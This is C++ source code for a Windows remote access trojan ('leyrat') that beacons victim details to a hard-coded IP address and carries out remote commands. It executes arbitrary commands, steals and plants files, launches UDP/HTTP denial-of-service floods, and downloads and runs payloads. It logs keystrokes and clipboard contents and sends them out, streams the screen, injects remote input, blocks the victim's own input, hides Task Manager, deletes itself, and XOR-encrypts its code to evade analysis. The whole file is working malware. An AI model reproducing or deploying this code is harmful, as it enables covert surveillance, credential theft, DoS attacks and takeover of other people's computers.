
#pragma once

//#define NO_ACK_SERVER
#include "leyrat.h"
#include "leybuf.h"
#include "leynet.h"

//#include <Windows.h>
//#include <Mmsystem.h>
#include <stdlib.h>
#include <cstdio>

#include "jpge.h"


#ifndef DEBUG
#define printf(...) {}
#endif

leynet_udp net;

#define _VERSION 1

#define NETBUFFER_SIZE 0xFFFF

short serverport = 27065;
char serveraddress[25];

struct dossettings
{

	unsigned int time;
	unsigned int port;
	
	bool is_http;

	char addr[150];

	char pkg[255];
	unsigned char pkglen;

};

struct dlsettings
{
	char addr[255];
	char file[255];
	char store[255];

	bool dling;
	bool rundl;
	bool updatedl;

};

struct streamsettings
{
	unsigned int quality;
	unsigned int waittime;
	unsigned int width;
	unsigned int height;

};



bool hide_taskmgr = false;
bool hide_taskbar = false;
bool hide_desktop = false;

bool keyboardblock = false;
bool mouseblock = false;

dossettings doscfg;
dlsettings dlcfg;
streamsettings streamcfg;

int GetLocalName(LPWSTR buf, int bufsize)
{
	int localinfo1 = GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, bufsize);

	if (localinfo1)
	{
		bufsize -= localinfo1;
		if (bufsize < 1)
			return 0;

		buf += --bufsize;
		*buf++ = '-';
		*buf = 0;

		return GetLocaleInfoW(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, bufsize);
	}
	return 0;
}

int ackserver(const char *ip)
{
#ifdef NO_ACK_SERVER
	return 0;
#endif

	char username[256 + 1];
	char clanguage[100];

	unsigned long username_len = 256 + 1;
	GetUserName(username, &username_len);

	
	WCHAR localname[100];
	GetLocalName(localname, 50);

	int needed = WideCharToMultiByte(CP_UTF8, 0, localname, username_len, NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_UTF8, 0, localname, username_len, clanguage, sizeof(clanguage), NULL, NULL);


	unsigned long diskserial;
	GetVolumeInformationA(NULL, NULL, NULL, &diskserial, NULL, NULL, NULL, NULL);
	
	char computername[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerName(computername, &len);
	


	char reply[1024];

	leybuf buf(reply, 1024);
	buf.WriteString("\xDB\xDB", true);

	buf.WriteChar('a');

	buf.WriteInt32(_VERSION);
	buf.WriteInt32(diskserial);

	buf.WriteString(clanguage);
	buf.WriteString(username);
	buf.WriteString(computername);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());

	printf("Acknowledged Server! __ %i\n", buf.GetPos());


	return 0;
}

int ackserveract(char *ip, char*type)
{

	char reply[512];

	leybuf buf(reply, sizeof(reply));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('_');
	buf.WriteString(type);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());

	printf("Acknowledged Act: %s!\n", type);

	return 0;
}

int listfiles(char *ip, char*dir)
{

	unsigned int replylen = 6 + 4;

	char *reply = new char[0xFFFFF];

	memset(reply, 0, replylen);

	leybuf buf(reply, sizeof(reply));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('c');
	buf.WriteString(dir);

	WIN32_FIND_DATA data;

	void*file = FindFirstFile(dir, &data);

	if (file != INVALID_HANDLE_VALUE)
	{

		if (strlen(data.cFileName) < 0xFF)
		{
			buf.WriteString(data.cFileName);
		}


			
		while (FindNextFile(file, &data))
		{
			unsigned int namelen = strlen(data.cFileName);

			if (namelen >= 0xFF)
				continue;

			buf.WriteString(data.cFileName);
		}

		FindClose(file);
	}





	printf("Sent file list, files in %s[%i]!\n", dir, strlen(dir));

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());
	delete[] reply;

	return 0;
}

int uploadfile(char* ip, char*filename)
{
	
	HANDLE file = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!file)
	{
		char reply[5];

		leybuf buf(reply, sizeof(reply));
		buf.WriteString("\xDB\xDB", true);
		buf.WriteChar('e');

		net.SendTo(serveraddress, serverport, reply, 3);
		printf("Error while uploading file!\n");

		return 0;
	}




	char *reply = new char[0xFFFF];

	leybuf buf(reply, 0xFFFF);

	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('e');
	buf.WriteString(filename);

	
	unsigned long read = 0;

	if (!ReadFile(file, reply+buf.GetPos(), 0xFFFF-260-1, &read, 0))
	{
		net.SendTo(serveraddress, serverport, reply, buf.GetPos());

		CloseHandle(file);
		printf("Error while uploading file!\n");

		return 0;
	}
	
	buf.SetPos(buf.GetPos() + read);

	net.SendTo(serveraddress, serverport, reply, buf.GetPos());
	delete[] reply;

	CloseHandle(file);

	printf("Uploaded file: %s!\n", filename);

	return 0;
}

int downloadfile(const char*charip, char*filename, char*data, unsigned int datalen)
{

	HANDLE file = CreateFile(filename, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!file)
	{
		return 0;
	}

	unsigned long written;

	int wrotefile = WriteFile(file, data, datalen, &written, 0);

	if (!wrotefile)
	{
		return 0;
	}

	printf("wrote file: %s\n", filename);

	CloseHandle(file);

	return 0;
}



int recvfromthink()
{

	char *netrecbuffer = new char[NETBUFFER_SIZE];
	memset(netrecbuffer, 0, NETBUFFER_SIZE);
	
	int msgsize = 0;

	char charip[25];
	short port = 0;
	net.Receive(&msgsize, netrecbuffer, NETBUFFER_SIZE, charip, port);
	
	if (!msgsize)
	{
		delete[] netrecbuffer;
		return 0;
	}


	leybuf buf(netrecbuffer, msgsize);

	if (buf.ReadChar() != '\xDB' || buf.ReadChar() != '\xDB')
	{
		printf("unknown pkg from:%s!\n", charip);
		printf("upkg__%i:: %s\n", msgsize, netrecbuffer);

		delete[] netrecbuffer;
		return 0;
	}


	char type = buf.ReadChar();

	if (type == 'a')//acknowledge server
	{

		ackserver(charip);

		memset(serveraddress, 25, 0);
		strcpy(serveraddress, charip);
		serverport = port;
	}


	if (type == 'b')//run cmd
	{
		int show = (int)buf.ReadChar();

		char cmd[1024];
		buf.ReadString(cmd, sizeof(cmd));

		WinExec(cmd, show);
		ackserveract(charip, "b");

	}

	if (type == 'c')//list files
	{
		char directory[256];
		buf.ReadString(directory, sizeof(directory));


		listfiles(charip, directory);
	}

	if (type == 'd')//(download || delete) file, 0 length deletes file
	{
		char filename[256];
		buf.ReadString(filename, 256);

		unsigned int datalen = buf.GetNumBytesLeft();
		
		if (datalen == 0)
		{
			DeleteFile(filename);
			delete[] netrecbuffer;
			return ackserveract(charip, "d2");//delete
		}

		char data[NETBUFFER_SIZE];
		buf.ReadBytes(data, datalen);

		
		downloadfile(charip, filename, data, datalen);

		ackserveract(charip, "d1");//download
	}

	if (type == 'e')//upload file
	{
		char filename[256];
		buf.ReadString(filename, sizeof(filename));


		uploadfile(charip, filename);
	}

	if (type == 'g')//dos
	{

		memset(&doscfg, 0, sizeof(dossettings));
		
 
		unsigned int time = buf.ReadInt32();

		if (time == 0)
		{
			delete[] netrecbuffer;
			return 0;
		}

		doscfg.is_http = buf.ReadChar()==0;

	
		buf.ReadString(doscfg.addr, 150);
		doscfg.port = buf.ReadInt32();
		doscfg.pkglen = buf.ReadChar();
		buf.ReadBytes(doscfg.pkg, doscfg.pkglen);

		doscfg.time = time;
		ackserveract(charip, "g");
	}

	if (type == 'j')//screenshare
	{
		
		unsigned int quality = buf.ReadInt32();
		unsigned int waittime = buf.ReadInt32();
		unsigned int width = buf.ReadInt32();
		unsigned int height = buf.ReadInt32();

		streamcfg.width = width;
		streamcfg.height = height;
		streamcfg.waittime = waittime;
		streamcfg.quality = quality;
	
		printf("Start Stream: %lu __ %lu __ %lu __ %lu", quality, waittime, width, height);
		ackserveract(charip, "j");
	}

	if (type == 'l')//screenshare input
	{
		int isclick = buf.ReadChar();

		if (isclick)
		{

			int x = buf.ReadInt32();
			int y = buf.ReadInt32();

			SetCursorPos(x, y);
			
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

			printf("Received Screenshare mouse input %i:%i!\n", x, y );

			delete[] netrecbuffer;
			return ackserveract(charip, "l1");

		}

		if (isclick == 2)//right mouse click
		{
			int x = buf.ReadInt32();
			int y = buf.ReadInt32();

			SetCursorPos(x,y);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			
			printf("Received Screenshare mouse input %i:%i!\n", x, y);

			delete[] netrecbuffer;
			return ackserveract(charip, "l2");

		}

		int keystrokes = buf.ReadChar();

		int curpos = buf.GetPos();

		for (int i = 0; i < keystrokes; i++)
		{
			int vkkey = buf.ReadChar();
			keybd_event(vkkey, MapVirtualKey(vkkey, 0), 0, 0);
			Sleep(1);
			printf("PRESS KEY: %i\n", vkkey);
		}

		buf.SetPos(curpos);

		for (int i = 0; i < keystrokes; i++)
		{
			int vkkey = buf.ReadChar();
			keybd_event(vkkey, MapVirtualKey(vkkey, 0), KEYEVENTF_KEYUP, 0);
			Sleep(1);
			printf("UNPRESS KEY: %i\n", vkkey);
		}


		
		printf("Received Screenshare input!\n");
		ackserveract(charip, "l");
	}

	if (type == '1')//update/download/dl&execute
	{


		buf.ReadString(dlcfg.addr, 255);//what host to dl from
		buf.ReadString(dlcfg.file, 255);//where at the host is it stored
		buf.ReadString(dlcfg.store, 255);//where should we save it

		char extras = buf.ReadChar();

		if (extras == 1)
			dlcfg.rundl = true;

		if (extras == 2)
			dlcfg.updatedl = true;

		dlcfg.dling = true;

		printf("Start DL: %s%s store: %s\n", dlcfg.addr, dlcfg.file, dlcfg.store);

		ackserveract(charip, "1");
	}

	if (type == '2')//suicide
	{
		ackserveract(charip, "2");
		Sleep(10);
		

		TCHAR szFile[MAX_PATH], szCmd[MAX_PATH+20];
		GetModuleFileName(NULL, szFile, MAX_PATH);

		sprintf(szCmd, "/c del %s >> NUL", szFile);

		if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && WinExec(szCmd, SW_HIDE))
		{
			ExitProcess(-1);
		}

	}

	if (type == '3')//input block
	{
		ackserveract(charip, "3");

		if (buf.ReadChar() != '\0')
		{
			keyboardblock = buf.ReadChar() != '\0';
		}else{
			mouseblock = buf.ReadChar() != '\0';
		}

	}


	if (type == '4')//task mgr
	{
		ackserveract(charip, "4");

		hide_taskmgr = buf.ReadChar() != '\0';
	}

	if (type == '5')//task bar
	{
		ackserveract(charip, "5");

		hide_taskbar = buf.ReadChar() != '\0';
	}


	if (type == '6')//desktop
	{
		ackserveract(charip, "6");

		hide_desktop = buf.ReadChar() != '\0';
	}


	if (type == '7')//disk tray 
	{
		ackserveract(charip, "7");

		bool open = buf.ReadChar() != '\0';

		if (open)
		{
			mciSendString("set cdaudio door open", 0, 0, 0);
		}else{
			mciSendString("set cdaudio door closed", 0, 0, 0);
		}
	}

	delete[] netrecbuffer;

	return 0;
}


int ackserverthread()
{

	while (true)
	{
		ackserver(serveraddress);
		//Sleep(60000);
		Sleep(5000);

	}

	return 0;
}


int dosthread()
{
	leynet_udp *udp = new leynet_udp;
	leynet_tcp *tcp = new leynet_tcp;

	SYSTEMTIME st;
	GetSystemTime(&st);
	

	udp->Start();
	tcp->Start();
	
	int ms = 0;

	while (true)
	{

		Sleep(1);

		if (!doscfg.time)
		{
			tcp->CloseConnection();
			udp->CloseSocket();
			Sleep(100);
			continue;
		}
		ms++;

		if (ms == 1000)
		{
			ms = 0;
			doscfg.time--;

		}

		printf("DOSING: %s, port: %i | pkglen: %lu\n", doscfg.addr, doscfg.port, doscfg.pkglen);

		if (!doscfg.is_http)
		{

			if (!udp->GetPort())
			{
				udp->OpenSocket(37056 + st.wMilliseconds);
				udp->SetNonBlocking(true);
			}

			udp->SendTo(doscfg.addr, doscfg.port, doscfg.pkg, doscfg.pkglen);
			//httpdos
			continue;
		}

		if (!tcp->GetPort())
		{
			tcp->OpenConnection(doscfg.addr, doscfg.port);
			tcp->SetNonBlocking(true);
		}

		tcp->HTTPGet(doscfg.pkg);



		//dos
	}

	return 0;
}


static leynet_tcp *tcp_temp;
// static void *penis; //decltype(leynet_tcp::TLenFin) penis = &leynet_tcp::TLenFin;

int downloadthread()
{

	SYSTEMTIME st;
	GetSystemTime(&st);

	leynet_tcp *tcp = new leynet_tcp;
	tcp->Start();

	char*buf = 0;

	while (1)
	{
		Sleep(100);

		if (!dlcfg.dling)
		{
			if (buf)
			{
				delete[] buf;
				buf = 0;
			}
			tcp->CloseConnection();
			continue;
		}



		tcp->OpenConnection(dlcfg.addr, 80);
		tcp->SetNonBlocking(true);
		tcp->HTTPGet(dlcfg.file);


		tcp_temp = tcp;
		tcp_temp->timefin = 10;


		buf = new char[50000000];
		int size = 0;
		tcp->Receive(&size, buf, 50000000, [](int a, int b, char *c, char*d) -> bool
		{
			return tcp_temp->THTTPLenFin(a, b, c, d);
		});

		tcp->HTTPParse(&size, buf);

		if (!size)
		{
			tcp->CloseConnection();
			dlcfg.dling = false;
			continue;
		}

		printf("AY\n");


		char absfile[MAX_PATH];

		if (dlcfg.updatedl)
		{
			

			GetModuleFileName(NULL, absfile, MAX_PATH);
			strcpy(dlcfg.store, absfile);

			MoveFile(absfile, "C:/ab");
			Sleep(100);

		}

		downloadfile(serveraddress, dlcfg.store, buf, size);

		if (dlcfg.rundl)
		{
			WinExec(dlcfg.store, 0);
		}

		if (dlcfg.updatedl)
		{
			net.CloseSocket();
			tcp->CloseConnection();

			WinExec(absfile, 0);

			Sleep(1000);

			TCHAR szFile[MAX_PATH], szCmd[MAX_PATH+20];
			strcpy(szFile, "C:\\ab");
			sprintf(szCmd, "/c del %s >> NUL", szFile);

			if (GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0 && WinExec(szCmd, SW_HIDE))
			{
				ExitProcess(-1);
			}


		}

		tcp->CloseConnection();

		dlcfg.dling = false;

	}
	return 0;
}

HWND oldwin = 0;

char* ClipBoard = 0;
char* WindowName = 0;
char* KeyLog = 0;

leybuf* WriteKeyLog = 0;

HHOOK hooker;
bool shift = false;
bool caps = false;

int keylogthread()
{
	if (!WriteKeyLog||!WindowName)
	{
		ClipBoard = new char[300];
		WindowName = new char[300];
		KeyLog = new char[0xFFFF];

		WriteKeyLog = new leybuf(KeyLog, 0xFFFF, 0);

		memset(WindowName, 300, 0);
		memset(ClipBoard, 300, 0);
		memset(KeyLog, 0xFFFF, 0);

	}

	while (1)
	{

		BOOL openclipboard = OpenClipboard(0);

		if (openclipboard)
		{
			HANDLE datahandle = GetClipboardData(CF_TEXT);

			if (datahandle)
			{


				char*data = (char*)GlobalLock(datahandle);

				if (data&&strcmp(data, ClipBoard))
				{
					memset(ClipBoard, 300, 0);

					unsigned int l = strlen(data);

					if (l >= 300)
						l = 299;

					memcpy(ClipBoard, data, l);
					ClipBoard[l] = 0;

					char tmpclip[350];

					sprintf(tmpclip, "[C]%s[/C]", ClipBoard);
					WriteKeyLog->WriteString(tmpclip, true);


				}

				GlobalUnlock(datahandle);

			}


			CloseClipboard();
		}

		if (!oldwin||oldwin != GetForegroundWindow())
		{
			oldwin = GetForegroundWindow();
			memset(WindowName, 300, 0);

			char tmpwin[260];

			GetWindowText(oldwin, tmpwin, 260);
			sprintf(WindowName, "\n===== %s =====\n", tmpwin);
			WriteKeyLog->WriteString(WindowName, true);


		}
		if (GetAsyncKeyState(VK_CAPITAL) & 1)
		{
			caps = !caps;
			//WriteKeyLog->WriteString("\x01", true);

		}

		if (GetAsyncKeyState(VK_SHIFT))
		{
			if (!shift)
			{
				//WriteKeyLog->WriteString("\x01", true);
				shift = true;
			}
		}else {
			if (shift)
			{
				//WriteKeyLog->WriteString("\x01", true);
				shift = false;
			}

		}

		if (GetAsyncKeyState(VK_CONTROL) & 1)
		{
			WriteKeyLog->WriteString("~", true);

		}

		if (GetAsyncKeyState(VK_MENU) & 1)
		{
			WriteKeyLog->WriteString("|", true);
		}

		if (GetAsyncKeyState(VK_TAB) & 1)
		{
			WriteKeyLog->WriteString("\t", true);
		}

		if (GetAsyncKeyState(VK_RETURN) & 1)
		{
			WriteKeyLog->WriteString("\n", true);//used to be {R}
		}

		if (GetAsyncKeyState(VK_BACK) & 1)
		{
			WriteKeyLog->SetPos(WriteKeyLog->GetPos() - 1);
		}

		if (GetAsyncKeyState(VK_OEM_PERIOD) & 1)
		{
			WriteKeyLog->WriteString(".", true);
		}

		if (GetAsyncKeyState(VK_OEM_COMMA) & 1)
		{
			WriteKeyLog->WriteString(",", true);
		}

		if (GetAsyncKeyState(VK_OEM_PLUS) & 1)
		{
			WriteKeyLog->WriteString("+", true);
		}

		if (GetAsyncKeyState(VK_OEM_MINUS) & 1)
		{
			WriteKeyLog->WriteString("-", true);
		}

		if (GetAsyncKeyState(VK_SPACE) & 1)
		{
			WriteKeyLog->WriteString(" ", true);
		}

		for (int i = 'A'; i <= 'Z'; i++)
		{


			if (GetAsyncKeyState(i) &1)
			{
				if (!shift&&!caps||caps&&shift)
				{
					i = i + 32;
					WriteKeyLog->WriteChar(i);
				}
				else {
					WriteKeyLog->WriteChar(i);
				}
					
			}
		}

		for (int i = '0'; i <= '9'; i++)
		{


			if (GetAsyncKeyState(i) & 1)
			{
				if (!shift&&!caps || caps&&shift)
				{
					WriteKeyLog->WriteChar(i);
				}
				else {

					i = i - 16;
					WriteKeyLog->WriteChar(i);
				}

			}
		}

		Sleep(5);

		
	}

	return 0;
}

int keylogsendthread()
{
	while (1)
	{

		Sleep(10000);

		if (!WriteKeyLog)
			continue;

		int logsize = WriteKeyLog->GetPos();

		if (logsize == 0)
			continue;

		char *reply = new char[logsize + 10];
		leybuf buf(reply, logsize + 10);

		buf.WriteString("\xDB\xDB", true);

		buf.WriteChar('!');
		buf.WriteInt32(logsize);
		buf.WriteBytes(WriteKeyLog->GetData(), logsize);//the keylog

	//	printf("LOL: %s\n", WriteKeyLog->GetData());
		net.SendTo(serveraddress, serverport, reply, buf.GetPos());
		delete[] reply;



		WriteKeyLog->SetPos(0);

	}

	return 0;
}

void capturescreen( )
{

	HDC hdc = CreateDC("DISPLAY", NULL, NULL, NULL);
	if (!hdc)
		return ;

	HDC memhdc = CreateCompatibleDC(hdc);

	int x1, y1, x2, y2, width, height;

	// get screen dimensions
	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	width = x2 - x1;
	height = y2 - y1;



	BITMAPINFO livebmpinfo;
	livebmpinfo.bmiHeader.biSize = sizeof(livebmpinfo.bmiHeader);
	livebmpinfo.bmiHeader.biWidth = x2;
	livebmpinfo.bmiHeader.biHeight = y2;
	livebmpinfo.bmiHeader.biPlanes = 1;
	livebmpinfo.bmiHeader.biBitCount = 32;
	livebmpinfo.bmiHeader.biCompression = BI_RGB;
	livebmpinfo.bmiHeader.biSizeImage = x2 * 4 * y2;
	livebmpinfo.bmiHeader.biClrUsed = 0;
	livebmpinfo.bmiHeader.biClrImportant = 0;

	char*rawimg;


	HBITMAP hbmp = CreateDIBSection(memhdc, &livebmpinfo, DIB_RGB_COLORS, (void**)(&rawimg), NULL, NULL);

	if (!hbmp)
	{
		DeleteObject(memhdc);
		return;
	}

	SelectObject(memhdc, hbmp);

	BitBlt(memhdc, 0, 0, x2, y2, hdc, 0, 0, SRCCOPY );
	StretchBlt(memhdc, 0, height, width, -height, hdc, 0, 0, width, height, SRCCOPY);


	int bufsize = width*height * 4;


	char *jpgbuf = new char[bufsize];

	jpge::params params;
	//params.m_no_chroma_discrim_flag = true;
	params.m_quality = streamcfg.quality;


	for (int i = 0; i < width*height*4; i++)
	{
		int b = (int)rawimg[i];
		int g = (int)rawimg[i + 1];
		int r = (int)rawimg[i + 2];
		int a = (int)rawimg[i + 3];

		rawimg[i] = r;
		rawimg[i + 1] = g;
		rawimg[i + 2] = b;
		rawimg[i + 3] = a;
		i = i + 3;
	}




	bool worked = jpge::compress_image_to_jpeg_file_in_memory(jpgbuf, bufsize, width, height, 4, (jpge::uint8*)rawimg, params);

	if (worked&&bufsize)
	{

		printf("START SENDING SCREENSHARE!\n");

		leynet_tcp *ss_tcp = new leynet_tcp;

		if(ss_tcp->OpenConnection(serveraddress, serverport + 1))
		{
			streamcfg.quality = 0;
			printf("END SCREENSHARE __ NO CONNECTION!\n");

			DeleteObject(hbmp);
			DeleteObject(memhdc);

			delete[] jpgbuf;
			delete[] ss_tcp;
			return;
		}


		char*sendbuf = new char[bufsize+ 100];
		leybuf send(sendbuf, bufsize + 100);
		send.WriteString("\xDB\xDB", true);

		send.WriteChar('j');
		send.WriteInt32(bufsize);
		send.WriteInt32(width);
		send.WriteInt32(height);
		send.WriteBytes(jpgbuf, bufsize);

		ss_tcp->Send(sendbuf, send.GetPos());


		printf("DONE SENDING SCREENSHARE!\n");

		ss_tcp->CloseConnection();


		delete[] sendbuf;
		delete[] ss_tcp;

	}

	DeleteObject(hbmp);
	DeleteObject(memhdc);

	delete[] jpgbuf;


}


int screensharethread()
{
	int started = false;
	
	while (true)
	{

		if (streamcfg.quality == 0||streamcfg.waittime==0)
		{
			Sleep(1000);
			started = false;
			continue;
		}

		capturescreen();


		Sleep(streamcfg.waittime);

	}
}

HHOOK HookKbd = NULL; //keyboard hook handle
HHOOK HookMouse = NULL; //mouse hook handle

LRESULT CALLBACK KbdHook(int nCode, WPARAM wp, LPARAM lp)
{
	printf("H1\n");

	return 1;
}

LRESULT CALLBACK MouseHook(int nCode, WPARAM wp, LPARAM lp)
{
	printf("H2\n");

	return 1;
}

int installhook(int type)
{

	if (type == 1)
	{
		printf("HOOK KBD");

		HookKbd = SetWindowsHookExA(WH_KEYBOARD_LL, KbdHook, GetModuleHandle(0), 0);

		if (!HookKbd)
		{
			printf("Couldn't hook kbd!");
			return 0;
		}

	}

	if (type == 2)
	{
		printf("HOOK MOUSE");

		HookMouse = SetWindowsHookExA(WH_MOUSE_LL, MouseHook, GetModuleHandle(0), 0);

		if (!HookMouse)
		{
			printf("Couldn't hook mouse!");
			return 0;
		}


	}

	return 0;
}

int uninstallhook(int type)
{
	if (type == 1)
	{
		printf("UNHOOK KBD");

		UnhookWindowsHookEx(HookKbd);
		HookKbd = 0;
	}

	if (type == 2)
	{
		printf("UNHOOK MOUSE");

		UnhookWindowsHookEx(HookMouse);
		HookMouse = 0;
	}

	return 0;

}

int suppresskeythread()
{
	bool prev_hookmouse = false;
	bool prev_hookbd = false;

	while (1)
	{
		
		if (prev_hookbd != keyboardblock)
		{
			prev_hookbd = keyboardblock;

			if (keyboardblock)
				installhook(1);
			else
				uninstallhook(1);

		}

		if (prev_hookmouse != mouseblock)
		{
			prev_hookmouse = mouseblock;

			if (mouseblock)
				installhook(2);
			else
				uninstallhook(2);
		}


		if (keyboardblock || mouseblock)
		{
			MSG msg;

			while (PeekMessage(&msg, NULL, 0, 0, 1) > 0)
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);

			}
		}

		Sleep(1);

	}

	return 0;
}


LRESULT CALLBACK WndProc(HWND window, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg > 1000 && hide_taskmgr)
	{
		//printf("%lu\n", msg);
		return msg;
	}

	return DefWindowProc(window, msg, wParam, lParam);
}


int hidewindowsthread()
{

	WNDCLASSEX wcex = { 0 };
	wcex.cbSize = sizeof(wcex);
	wcex.lpfnWndProc = WndProc;
	wcex.hInstance = GetModuleHandleA(0);
	wcex.lpszClassName = "TaskManagerWindow";

	if (!RegisterClassEx(&wcex))
	{
		printf("rip window class: %i\n", GetLastError());
		return 1;
	}


	char *shit[] = { "Task-Manager", "Task Manager", "Windows Task Manager" };

	for (int i = 0; i < 3; i++)
	{
		HWND hWnd = CreateWindow("TaskManagerWindow", shit[i], WS_OVERLAPPEDWINDOW, 1, 1, 10, 10, 0, 0, GetModuleHandleA(0), 0);


		if (!hWnd)
		{
			printf("rip window: %i\n", GetLastError());
			return 1;
		}

		LONG lStyle = GetWindowLong(hWnd, GWL_STYLE) & ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZE | WS_MAXIMIZE | WS_SYSMENU);


		SetWindowLong(hWnd, GWL_STYLE, lStyle);
		SetWindowPos(hWnd, NULL, 0, 0, 0, 0, SWP_FRAMECHANGED | SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_NOOWNERZORDER);
		ShowWindow(hWnd, SW_HIDE);
		UpdateWindow(hWnd);

	}

	HANDLE mutex1 = 0;
	HANDLE mutex2 = 0;
	HANDLE mutex3 = 0;

	MSG msg;

	while (1)
	{

		if (PeekMessage(&msg, NULL, 0, 0, 1))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		HWND taskbar = FindWindow("Shell_TrayWnd", 0);
		HWND taskmgr = FindWindow(0, "Windows Task Manager");
		HWND desktop = FindWindow("Progman", 0);

		if (taskbar)
		{
			if (hide_taskbar)
			{
				ShowWindow(taskbar, SW_HIDE);
			}
			else {
				ShowWindow(taskbar, SW_SHOW);
			}
		}
		
		if (desktop)
		{
			if (hide_desktop)
			{
				ShowWindow(desktop, SW_HIDE);
				EnableWindow(desktop, false);
			}
			else {
				ShowWindow(desktop, SW_SHOW);
				EnableWindow(desktop, true);
			}
		}


		if (hide_taskmgr)
		{

			if (taskmgr)
			{
				PostMessage(taskmgr, WM_QUIT, (WPARAM)0, (LPARAM)0);
			}

			if (!mutex1)
			{
				mutex1 = CreateMutex(0, true, "TM.750ce7b0-e5fd-454f-9fad-2f66513dfa1b");
			}
		}
		else {
			if (mutex1)
				ReleaseMutex(mutex1);

			if (mutex2)
				ReleaseMutex(mutex2);

			if (mutex3)
				ReleaseMutex(mutex3);

		}


		Sleep(100);
	}
}


int renamethread()
{

	TCHAR szFile[MAX_PATH], szOldFile[MAX_PATH];

	GetModuleFileName(NULL, szFile, MAX_PATH);
	GetModuleFileName(NULL, szOldFile, MAX_PATH);

	while (1)
	{
		szFile[strlen(szFile) - 5] = szFile[strlen(szFile) - 5] + 1;

		if (szFile[strlen(szFile) - 5] > 57)
			szFile[strlen(szFile) - 5] = 48;

		MoveFileEx(szOldFile, szFile, 0);
		memcpy(szOldFile, szFile, MAX_PATH);
		szOldFile[strlen(szFile)] = 0;

		Sleep(1);
	}

}

int startrat()
{
	net.Start();
	net.OpenSocket(serverport);

	//strcpy(serveraddress, "37.4.63.216");
	strcpy(serveraddress, "37.4.63.217");




	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ackserverthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)dosthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)downloadthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)keylogsendthread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)screensharethread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)suppresskeythread, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hidewindowsthread, 0, 0, 0);
	//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)renamethread, 0, 0, 0);

	while (true)
	{
		recvfromthink();
	}
}



int main(int argc, char** argv)
{

	startrat();

	return 0;
}


#pragma optimize("", off)



DWORD oldp;

int penis = 100;

int newmain()
{
	__asm
	{
		jmp $ + 7
		int 0xff
	}

	unsigned char *ourfunc = (unsigned char*)newmain;

	unsigned int ourlength;

	for (ourlength = 0; ourlength < 2000; ourlength++)
	{
		char opcode = ourfunc[ourlength];
		char next_opcode = ourfunc[ourlength+1];
		

		if (opcode == '\xCD' && next_opcode=='\xFE')
		{
			//printf("%x __ %x __ %x\n", opcode, next_opcode, ourlength);
			break;
		}

	}

	unsigned char* textsegment_start = (unsigned char*)0x15151515;
	unsigned char*textsegment_end = (unsigned char*)0x14141414;

	unsigned char* rdatasegment_start = (unsigned char*)0x13131313;
	unsigned char* rdatasegment_end = (unsigned char*)0x12121212;

	if (textsegment_start == (unsigned char*)0x15151515)
	{
		mainCRTStartup();
	}

	unsigned int encryptionkey;
	encryptionkey = 1337;


	unsigned int curkeychar;
	curkeychar = 0;


	unsigned int i;
	i = 0;
	

	VirtualProtect(textsegment_start, textsegment_end - textsegment_start, PAGE_EXECUTE_READWRITE, &oldp);

	while(true)
	{

		if (i== textsegment_end- textsegment_start )
		{
			break;
		}

		if (textsegment_start +i== (unsigned char*)newmain)
		{
			i = i + ourlength;
			continue;
		}

		textsegment_start[i] ^= (encryptionkey >> 8 * (i % 4)) & 0xff;


		i++;
	}


	i = 0;


	VirtualProtect(rdatasegment_start, textsegment_end - rdatasegment_end, PAGE_EXECUTE_READWRITE, &oldp);


	while (true)
	{
		if (rdatasegment_start + i == (unsigned char*)rdatasegment_end)
		{
			mainCRTStartup();
			break;
		}


		rdatasegment_start[i] ^= (encryptionkey >> 8 * (i % 4)) & 0xff;


		i++;
	}

	mainCRTStartup();

	__asm
	{
		jmp $ + 7
		int 0xfe
	}


	return 0;
}


#pragma optimize("", on)


